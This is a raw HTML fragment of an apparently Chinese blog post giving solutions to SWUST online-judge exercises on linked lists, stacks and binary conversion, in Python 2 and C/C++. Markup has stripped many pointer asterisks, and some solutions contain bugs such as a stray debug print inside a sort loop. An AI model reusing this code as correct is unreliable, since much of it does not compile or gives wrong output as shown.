class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/<em>#include&lt;stdio.h&gt;</em></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int n,m,i,s=0;</span></span><br><span class="line"><span class="comment">    scanf(“%d%d”,&amp;n,&amp;m);</span></span><br><span class="line"><span class="comment">    for(i=2;i&lt;=n;i++)</span></span><br><span class="line"><span class="comment">    s=(s+m)%i;</span></span><br><span class="line"><span class="comment">    printf(“%d”,s+1);</span></span><br><span class="line"><span class="comment">    return 0; </span></span><br><span class="line"><span class="comment"> &#125; /</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <em><span class="title">next</span>;</em></span></span><br><span class="line">&#125;linknode;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    linknode L,<em>r,</em>s;</span><br><span class="line">    L=(linknode <em>)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</em></span><br><span class="line">    r=L;</span><br><span class="line">    <span class="keyword">int</span> n,i;</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d%d”</span>,&amp;n,&amp;k);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s=(linknode )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</span><br><span class="line">        s-&gt;data=i;</span><br><span class="line">        r-&gt;next=s;</span><br><span class="line">        r=s;</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next=L-&gt;next;</span><br><span class="line">    linknode *p;</span><br><span class="line">    p=L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next!=p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;k<span class="number">-1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        p-&gt;next=p-&gt;next-&gt;next;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">“%d”</span>,p-&gt;data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div></div></div><h1 id="957-逆置单链表"><a href="#957-逆置单链表" class="headerlink" title="[957] 逆置单链表"></a>[957] 逆置单链表</h1><div class="tabs" id="957"><ul class="nav-tabs"><li class="tab active"><a href="#957-1">思路</a></li><li class="tab"><a href="#957-2">题目描述</a></li><li class="tab"><a href="#957-3">python代码实现</a></li><li class="tab"><a href="#957-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="957-1"><div class="note default"><blockquote><br><p>试试倒着输出</p><br></blockquote></div></div><div class="tab-pane" id="957-2"><p><a href="http://acm.swust.edu.cn/#/problems/957/-1?_k=qiijov" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>建立长度为n的单链表，然后将其数据元素逆置，即第1个元素变为最后一个元素，第2个元素变为倒数第2个元素，以此类推，最后一个元素变为第1个元素。（处理的数据类型为字符型。必须使用链表完成。）</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>第一行为链表长度n；<br>第二行为链表中的n个数据元素的值。</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>逆置后的原始的值。</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line">ABCDEFGHIJ</span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">J I H G F E D C B A</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="957-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">try</span>:  </span><br><span class="line">    <span class="keyword">while</span> True:  </span><br><span class="line">        n=<span class="keyword">int</span> (input())  </span><br><span class="line">        a = []</span><br><span class="line">        d = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x in raw_input():  </span><br><span class="line">            a.append(x)</span><br><span class="line">            d = d+<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i in range(d<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">            print a[i],</span><br><span class="line">except EOFError:  </span><br><span class="line">    <span class="built_in">exit</span>()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="957-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> elem;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    elem data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <em><span class="title">next</span>;</em></span></span><br><span class="line">&#125;linknode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initlist</span><span class="params">(linknode &amp;L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L=(linknode <em>)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</em></span><br><span class="line">    L-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creatlist</span><span class="params">(linknode &amp;L,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    linknode <em>s;</em></span><br><span class="line">    L=(linknode )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</span><br><span class="line">    L-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s=(linknode <em>)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</em></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">“%c”</span>,&amp;s-&gt;data);</span><br><span class="line">        s-&gt;next=L-&gt;next;</span><br><span class="line">        L-&gt;next=s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">desplist</span><span class="params">(linknode &amp;L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    linknode <em>p=L-&gt;next;</em></span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">“%c “</span>,p-&gt;data);</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;n);</span><br><span class="line">    linknode la;</span><br><span class="line">    initlist(la);</span><br><span class="line">    creatlist(la,n);</span><br><span class="line">    desplist(la);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></div></div><h1 id="960-双向链表的操作问题"><a href="#960-双向链表的操作问题" class="headerlink" title="[960] 双向链表的操作问题"></a>[960] 双向链表的操作问题</h1><div class="tabs" id="960"><ul class="nav-tabs"><li class="tab active"><a href="#960-1">思路</a></li><li class="tab"><a href="#960-2">题目描述</a></li><li class="tab"><a href="#960-3">python代码实现</a></li><li class="tab"><a href="#960-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="960-1"><div class="note default"><blockquote><br><p>。。。</p><br></blockquote></div></div><div class="tab-pane" id="960-2"><p><a href="http://acm.swust.edu.cn/#/problems/960/-1?_k=5g1kaa" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>建立一个长度为n的带头结点的双向链表，使得该链表中的数据元素递增有序排列。（必须使用双向链表完成，数据类型为整型。）</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>第一行：双向表的长度；<br>第二行：链表中的数据元素。</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>输出双向链表中的数据元素的值。</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span> <span class="number">6</span> <span class="number">3</span> <span class="number">5</span> <span class="number">8</span> <span class="number">10</span> <span class="number">21</span> <span class="number">12</span> <span class="number">9</span></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">8</span> <span class="number">9</span> <span class="number">10</span> <span class="number">12</span> <span class="number">21</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="960-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a = []</span><br><span class="line">n = <span class="keyword">int</span>(input())</span><br><span class="line">a = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">int</span>, raw_input().split()))</span><br><span class="line"></span><br><span class="line">a.sort(reverse = False)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(len(a)):</span><br><span class="line">    print a[i],</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="960-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <em><span class="title">prior</span>;</em></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">next</span>;</span></span><br><span class="line">&#125;linknode;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creatlist</span><span class="params">(linknode <em>&amp;L,<span class="keyword">int</span> a[],<span class="keyword">int</span> n)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    linknode s,<em>r;</em></span><br><span class="line">    L=(linknode )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</span><br><span class="line">    r=L;</span><br><span class="line">    r-&gt;prior=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        r-&gt;data=a[i];</span><br><span class="line">        s=(linknode <em>)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linknode));</em></span><br><span class="line">        r-&gt;next=s;</span><br><span class="line">        s-&gt;prior=r;</span><br><span class="line">        s-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">        r=s;</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">paixu</span><span class="params">(linknode root )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    linknode <em>p,</em>q;</span><br><span class="line">    p=root;</span><br><span class="line">    q=root-&gt;next;</span><br><span class="line">     <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">int</span> t;</span><br><span class="line">         q=root-&gt;next;</span><br><span class="line">         <span class="keyword">while</span>(q!=<span class="literal">NULL</span>)</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="keyword">if</span>(p-&gt;data&gt;q-&gt;data)</span><br><span class="line">             &#123;</span><br><span class="line">                 t=p-&gt;data;</span><br><span class="line">                 p-&gt;data=q-&gt;data;</span><br><span class="line">                q-&gt;data=t;</span><br><span class="line">              &#125; </span><br><span class="line">              <span class="built_in">cout</span>&lt;&lt;p-&gt;data&lt;&lt;<span class="string">“ “</span>&lt;&lt;q-&gt;data&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line">              q=q-&gt;next;</span><br><span class="line">         &#125;</span><br><span class="line">         p=p-&gt;next;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(linknode <em>head)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    linknode p=head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;p-&gt;data;</span><br><span class="line">        p=p-&gt;next; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"> &#125; </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(linknode <em>root)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    linknode p=root;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;p-&gt;data&lt;&lt;<span class="string">“ “</span>;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    linknode *root;</span><br><span class="line">    <span class="keyword">int</span> n,a[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    creatlist(root,a,n);</span><br><span class="line">    paixu(root);</span><br><span class="line">    output(root);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div><h1 id="961-进制转换问题"><a href="#961-进制转换问题" class="headerlink" title="[961] 进制转换问题"></a>[961] 进制转换问题</h1><div class="tabs" id="961"><ul class="nav-tabs"><li class="tab active"><a href="#961-1">思路</a></li><li class="tab"><a href="#961-2">题目描述</a></li><li class="tab"><a href="#961-3">python代码实现</a></li><li class="tab"><a href="#961-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="961-1"><div class="note default"><blockquote><br><p>百度：十进制转二进制</p><br></blockquote></div></div><div class="tab-pane" id="961-2"><p><a href="http://acm.swust.edu.cn/#/problems/961/-1?_k=s4rlp7" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>建立顺序栈或链栈，编写程序实现十进制数到二进制数的转换。</p></blockquote><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><blockquote><p>输入只有一行，就是十进制整数。</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><blockquote><p>转换后的二进制数。</p></blockquote><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1010</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="961-3"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">def Dec2Bin(dec):</span><br><span class="line">    result = <span class="string">‘’</span></span><br><span class="line">    if dec:</span><br><span class="line">        result = Dec2Bin(dec <span class="comment">// 2)</span></span><br><span class="line">        <span class="keyword">return</span> result + str(dec % <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">n = <span class="keyword">int</span>(raw_input())</span><br><span class="line">sys.<span class="built_in">stdout</span>.write(Dec2Bin(n))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="961-4"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> elemtype;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    elemtype data[max];</span><br><span class="line">    <span class="keyword">int</span> top;</span><br><span class="line">&#125;sqstack;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initstack</span><span class="params">(sqstack <em>&amp;s)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s=(sqstack )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(sqstack));</span><br><span class="line">    s-&gt;top=<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(sqstack <em>&amp;s,elemtype e)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s-&gt;top++;</span><br><span class="line">    s-&gt;data[s-&gt;top]=e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(sqstack &amp;s,elemtype &amp;e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e=s-&gt;data[s-&gt;top];</span><br><span class="line">    s-&gt;top–;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">empty</span><span class="params">(sqstack <em>&amp;s)</em></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (s-&gt;top==<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">conversion</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> e;</span><br><span class="line">    sqstack p=(sqstack *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(sqstack));</span><br><span class="line">    initstack(p);</span><br><span class="line">    <span class="keyword">while</span>(n)</span><br><span class="line">    &#123;</span><br><span class="line">        push(p,n%<span class="number">2</span>);</span><br><span class="line">        n=n/<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!empty(p))</span><br><span class="line">    &#123;</span><br><span class="line">        pop(p,e);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">“%d”</span>,e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">“%d”</span>,&amp;n);</span><br><span class="line">    conversion(n);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div></div></div><h1 id="963-小偷的背包"><a href="#963-小偷的背包" class="headerlink" title="[963] 小偷的背包"></a>[963] 小偷的背包</h1><div class="tabs" id="963"><ul class="nav-tabs"><li class="tab active"><a href="#963-1">思路</a></li><li class="tab"><a href="#963-2">题目描述</a></li><li class="tab"><a href="#963-3">python代码实现</a></li><li class="tab"><a href="#963-4">数据结构实现</a></li></ul><div class="tab-content"><div class="tab-pane active" id="963-1"><div class="note default"><blockquote><br><p>背包</p><br></blockquote></div></div><div class="tab-pane" id="963-2"><p><a href="http://acm.swust.edu.cn/#/problems/963/-1?_k=a23frg" target="_blank" rel="noopener">传送门</a></p><h2 id="描述"><a href="#描述" class="headerlink" 